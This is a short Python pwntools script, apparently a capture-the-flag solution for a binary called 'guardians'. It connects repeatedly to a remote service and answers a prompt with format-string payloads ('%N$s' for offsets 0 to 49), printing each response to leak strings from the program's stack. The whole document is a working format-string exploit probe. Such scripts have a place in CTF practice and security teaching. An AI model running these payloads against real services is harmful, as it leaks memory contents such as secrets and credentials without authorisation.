
from pwn import *
elf=ELF("./guardians")
for i in range(50):
#autofmt
    try: 
        p=remote("host",port)
        p.sendlineafter(b"Does Quill manage to win the dance battle?",'%{}$s'.format(i).encode())
        p.recvline()
        p.recvline()
        p.recvline()
        result=p.recvline()
        print(str(i)+": "+ str(result))
    except:
        pass
